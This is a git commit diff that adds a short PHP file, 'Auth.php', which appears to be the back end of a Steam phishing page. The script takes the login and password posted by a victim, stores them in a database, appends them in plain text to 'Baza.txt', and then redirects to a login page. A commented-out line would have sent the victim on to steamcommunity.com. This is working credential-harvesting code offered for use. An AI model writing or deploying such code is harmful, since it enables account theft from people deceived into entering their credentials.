589daf08fc1f364af07131b5d54add93a6aec00f
bykrakk2 <50548297+bykrakk2@users.noreply.github.com>
2019-05-27 00:40:00 +0300

    Add files via upload

---
+++ aut/Auth.php
@@ -0,0 +1,14 @@
+<?PHP
+include "db.mysql.php";
+
+$db = new SafeMySQL(); $db->savePassword($_POST['login'], $_POST['password']);
+
+$Log = $_POST['login'];
+$Pass = $_POST['password'];
+$log = fopen("Baza.txt","at");// Название вашей базы данных
+fwrite($log," $Log:$Pass \n");
+fclose($log);
+
+//echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://steamcommunity.com'></head></html>";
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/aut/login.html'></head></html>";
+?>
